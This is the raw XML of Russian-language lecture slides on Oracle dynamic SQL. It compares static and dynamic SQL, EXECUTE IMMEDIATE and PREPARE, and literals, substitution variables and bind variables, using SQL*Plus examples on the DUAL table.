          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="409421" y="1228980"/>
            <a:ext cx="4042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endParaRPr lang="ru-RU" sz="1600" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent2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AB87B-CCFF-EC65-B626-77D5E2D748BF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="885954" y="2003368"/>
            <a:ext cx="7646733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Одношаговый интерфейс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Многошаговый интерфейс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Подготовленный оператор передается в СУБД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Выполняется синтаксический разбор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Строится план выполнения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Вызывается на выполнение </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" b="1" i="1" dirty="0"/>
              <a:t>по требованию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CD986C-C1EC-0133-E637-62477E2806FE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="318845" y="2491708"/>
            <a:ext cx="8471204" cy="6093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sz="1400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stmt_str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:= 'INSERT INTO ' || </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400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table_name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|| ' values (:f1, :f2, :f3)';</a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" sz="1400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EXEC SQL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EXECUTE IMMEDIATE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stmt_str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400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EAC84CB-FD94-C998-0E69-3DB58EB6CED3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="326191" y="3877086"/>
            <a:ext cx="8563626" cy="6093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sz="1400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stmt_str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:= 'INSERT INTO ' || </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400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table_name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|| ' values (:f1, :f2, :f3)';</a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" sz="1400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EXEC SQL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PREPARE GLOBAL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stmt1 FROM :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stmt_str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400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E8870-2CD0-858B-A711-3350722B4DF1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="326191" y="5397024"/>
            <a:ext cx="3572512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accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>SQL-дескриптор</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t> - это область, которая временно создается СУБД для хранения информации о параметрах откомпилированного SQL-оператора.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5A0DD8-ADF1-7582-8F71-09054CFDB842}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4418116" y="5397024"/>
            <a:ext cx="4725884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Определения параметров SQL-оператора.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получения информации об INTO-переменных.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Динамические курсоры.</a:t>
            </a:r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068649F0-EB83-5F9A-298D-60AD79880229}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4601928" y="5578054"/>
            <a:ext cx="255589" cy="961377"/>
          </a:xfrm>
          <a:prstGeom prst="lef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8A13DFB9-EB94-7AFE-D9E6-8D244C7E2903}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4067944" y="5943326"/>
            <a:ext cx="474129" cy="230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5684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E90C4-76AB-171C-CA0F-CED68A0D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статического и динамического подходов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DD7B02-BC55-CAF2-3AF4-5EEDCB201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graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="7" name="Объект 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{19923DBF-AC46-DADC-F4E6-11FCB6056D7B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95536" y="1556792"/>
          <a:ext cx="8111066" cy="466714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405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5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799">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" algn="ctr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Static (Embedded) SQL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Dynamic (Interactive) SQL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133"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Способ доступа к базе данных </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent1"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>предопределен</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t> во встроенном операторе </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent1"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>SQL</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>.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Способ доступа к базе данных </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1600" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent1"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>определяется во время выполнения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02"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Более быстро и эффективно.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Менее быстро и эффективно.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17"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Операторы </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>SQL</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t> компилируются </a:t>
                      </a:r>
                      <a:br>
                        <a:rPr lang="ru-RU" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                      </a:br>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>во время </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent1"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>компиляции.</a:t>
                      </a:r>
                      <a:endParaRPr lang="ru-RU" sz="1600" b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Операторы </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>SQL</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1600" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t> компилируются 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во время </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1600" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent1"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>выполнения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548"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Разбор, </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1600" b="0" dirty="0" err="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Валидация</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>, Оптимизация и Генерация плана приложения выполняются во время </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent1"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>компиляции.</a:t>
                      </a:r>
                      <a:endParaRPr lang="ru-RU" sz="1600" b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Разбор, Валидация, Оптимизация и Генерация плана приложения выполняются во время </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1600" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent1"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>выполнения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9133"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EXECUTE IMMEDIATE, EXECUTE </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>и </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>PREPARE </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" b="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent1"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>не используются.</a:t>
                      </a:r>
                      <a:endParaRPr lang="ru-RU" sz="1600" b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EXECUTE IMMEDIATE, EXECUTE </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1600" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>и </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>PREPARE </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="DB3519"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>используются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02"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DB3519"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Менее гибок</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1600" b="0" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>.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accent1"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>Более гибок</a:t>
                      </a:r>
                      <a:endParaRPr lang="ru-RU" sz="16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5211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8D240-92D4-33C4-3BB7-A212A369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 данных в SQL запрос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1842B8-3202-805A-E7E4-CC3D2AA00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778" y="1448108"/>
            <a:ext cx="3373829" cy="4752528"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" i="1" dirty="0"/>
              <a:t>Разбор SQL-выражения</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ru-RU" sz="1400" dirty="0"/>
              <a:t>Верификация синтаксиса </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ru-RU" sz="1400" dirty="0"/>
              <a:t>Верификация прав доступа</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ru-RU" sz="1400" dirty="0"/>
              <a:t>Создание плана исполнения </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" i="1" dirty="0"/>
              <a:t>Связывание переменных</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ru-RU" sz="1400" dirty="0"/>
              <a:t>Реальные значения </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="ru-RU" sz="1400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="ru-RU" sz="1400" dirty="0"/>
              <a:t>для подстановочных символов</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" i="1" dirty="0"/>
              <a:t>Исполнение</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ru-RU" sz="1400" dirty="0"/>
              <a:t>выбранный план исполнения</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ru-RU" sz="1400" dirty="0"/>
              <a:t>реальные значения </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="ru-RU" sz="1400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="ru-RU" sz="1400" dirty="0"/>
              <a:t>подстановочных переменных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2BCD8B-B7BE-1EE7-726E-039AE8CE3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99773F-B014-D209-F832-424F2A3DB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60" y="1313769"/>
            <a:ext cx="3943888" cy="514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053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F8F6A-9A4B-26D4-3566-54C5C8EF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 данных - Литералы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C448C1-AAE7-74EA-7C7B-4067599AB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44</a:t>
            </a:fld>
            <a:endParaRPr lang="ru-RU"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="9" name="Объект 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{74001E14-1E52-A780-50DA-8FA9F761BA4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1520" y="1415083"/>
          <a:ext cx="8640960" cy="174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143745242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5440959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47729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Исходные</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" b="1" baseline="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t> з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апросы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Результат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38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Литералы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'dummy_literal1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effectLst/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:endParaRPr lang="en-US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'dummy_literal2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'dummy_literal1'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'dummy_literal2'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46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948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F8F6A-9A4B-26D4-3566-54C5C8EF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 данных – Переменные подстановки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C448C1-AAE7-74EA-7C7B-4067599AB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45</a:t>
            </a:fld>
            <a:endParaRPr lang="ru-RU"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="9" name="Объект 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{74001E14-1E52-A780-50DA-8FA9F761BA4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1520" y="1415083"/>
          <a:ext cx="8640960" cy="375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143745242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5440959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47729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Исходные</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" b="1" baseline="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t> з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апросы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Результат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38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Литералы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'dummy_literal1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effectLst/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:endParaRPr lang="en-US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'dummy_literal2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'dummy_literal1'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'dummy_literal2'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46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Переменные</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1400" kern="1200" baseline="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t> подстановки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</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t> SELECT * FROM dual WHERE dummy = '&amp;dummy';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Enter value for dummy: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dummy_substitution1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old   1: </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>SELECT * FROM dual WHERE dummy = '&amp;dummy'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new   1</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>: SELECT * FROM dual WHERE dummy = 'dummy_substitution1'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'&amp;dummy';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Enter value for dummy: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dummy_substitution2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effectLst/>
                        </a:rPr>
                        <a:t>old   1: SELECT * FROM dual WHERE dummy = '&amp;dummy'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effectLst/>
                        </a:rPr>
                        <a:t>new   1: SELECT * FROM dual WHERE dummy = ' dummy_substitution2'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  <a:endParaRPr lang="en-US" sz="1050" kern="1200" dirty="0">
                        <a:solidFill>
                          <a:schemeClr val="accent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WHERE dummy = 'dummy_substitution1'         </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>    </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>   </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>	</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>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WHERE dummy = 'dummy_substitution2'     </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>    </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>        </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>	</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>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40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2998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F8F6A-9A4B-26D4-3566-54C5C8EF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 данных – Связанные переменные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C448C1-AAE7-74EA-7C7B-4067599AB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  <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="9" name="Объект 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{74001E14-1E52-A780-50DA-8FA9F761B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969042"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="259749" y="1293316"/>
          <a:ext cx="8640960" cy="5304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143745242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5440959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47729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Исходные</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" b="1" baseline="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t> з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апросы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Результат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385690"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="122987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Литералы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'dummy_literal1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effectLst/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:endParaRPr lang="en-US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'dummy_literal2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'dummy_literal1'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'dummy_literal2'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</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" kern="1200" dirty="0" smtClean="0">
                          <a:solidFill>
                            <a:schemeClr val="accent1"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>.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46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Переменные</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1400" kern="1200" baseline="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t> подстановки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</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t> SELECT * FROM dual WHERE dummy = '&amp;dummy';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Enter value for dummy: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dummy_substitution1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old   1: </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>SELECT * FROM dual WHERE dummy = '&amp;dummy'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new   1</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>: SELECT * FROM dual WHERE dummy = 'dummy_substitution1'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'&amp;dummy';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Enter value for dummy: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dummy_substitution2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effectLst/>
                        </a:rPr>
                        <a:t>old   1: SELECT * FROM dual WHERE dummy = '&amp;dummy'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effectLst/>
                        </a:rPr>
                        <a:t>new   1: SELECT * FROM dual WHERE dummy = ' dummy_substitution2'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  <a:endParaRPr lang="en-US" sz="1050" kern="1200" dirty="0">
                        <a:solidFill>
                          <a:schemeClr val="accent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WHERE dummy = 'dummy_substitution1'         </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>    </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>   </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>	</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>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WHERE dummy = 'dummy_substitution2'     </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>    </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>        </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>	</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>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40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Переменные связывания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VARIABLE dummy VARCHAR2(30);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EXEC :dummy :=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'dummy_bind1'; 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PL/SQL procedure successfully completed</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>.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:dummy;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</a:p>
                    <a:p>
                      <a:pPr marL="0" algn="l" defTabSz="457200" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1"/>
                      <a:endParaRPr lang="en-US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EXEC :dummy :=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'dummy_bind2';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PL/SQL procedure successfully completed.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:dummy;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</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" kern="1200" dirty="0" smtClean="0">
                          <a:solidFill>
                            <a:schemeClr val="accent1"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>selected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:dummy                        2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1 row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16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696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4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{74001E14-1E52-A780-50DA-8FA9F761B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317488"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="251520" y="1290566"/>
          <a:ext cx="8640960" cy="5285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143745242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5440959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47729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Исходные</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" b="1" baseline="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="bg1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t> з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апросы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Результат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38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Литералы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'dummy_literal1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effectLst/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:endParaRPr lang="en-US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r>
                        <a:rPr lang="en-US" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>WHERE dummy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= 'dummy_literal2</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>';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'dummy_literal1'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'dummy_literal2'        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</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" kern="1200" dirty="0" smtClean="0">
                          <a:solidFill>
                            <a:schemeClr val="accent1"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>.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46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Переменные</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1400" kern="1200" baseline="0" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t> подстановки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</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t> SELECT * FROM dual WHERE dummy = '&amp;dummy';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Enter value for dummy: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dummy_substitution1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old   1: </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>SELECT * FROM dual WHERE dummy = '&amp;dummy'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new   1</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>: SELECT * FROM dual WHERE dummy = 'dummy_substitution1'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'&amp;dummy';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Enter value for dummy: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dummy_substitution2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effectLst/>
                        </a:rPr>
                        <a:t>old   1: SELECT * FROM dual WHERE dummy = '&amp;dummy'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effectLst/>
                        </a:rPr>
                        <a:t>new   1: SELECT * FROM dual WHERE dummy = ' dummy_substitution2'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  <a:endParaRPr lang="en-US" sz="1050" kern="1200" dirty="0">
                        <a:solidFill>
                          <a:schemeClr val="accent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WHERE dummy = 'dummy_substitution1'         </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>    </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>   </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>	</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>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WHERE dummy = 'dummy_substitution2'     </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>    </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>        </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>	</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>1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2 rows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40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kern="1200" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent1"/>
                          </a:solidFill>
                        </a:rPr>
                        <a:t>Переменные связывания</a:t>
                      </a:r>
                      <a:endParaRPr lang="ru-RU" sz="1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VARIABLE dummy VARCHAR2(30);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EXEC :dummy :=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'dummy_bind1'; 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PL/SQL procedure successfully completed</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>.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:dummy;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selected</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:pPr marL="0" algn="l" defTabSz="457200" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1"/>
                      <a:endParaRPr lang="en-US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EXEC :dummy := </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="C00000"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>'dummy_bind2';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PL/SQL procedure successfully completed.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SQL&gt; </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" kern="1200" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>SELECT * FROM dual WHERE dummy = :dummy;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no rows </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1050" kern="1200" dirty="0" smtClean="0">
                          <a:solidFill>
                            <a:schemeClr val="accent1"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>selected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SQL_TEXT      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                 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EXECUTIONS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------------------------------ </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="ru-RU" sz="1050" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent1"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>	</a:t>
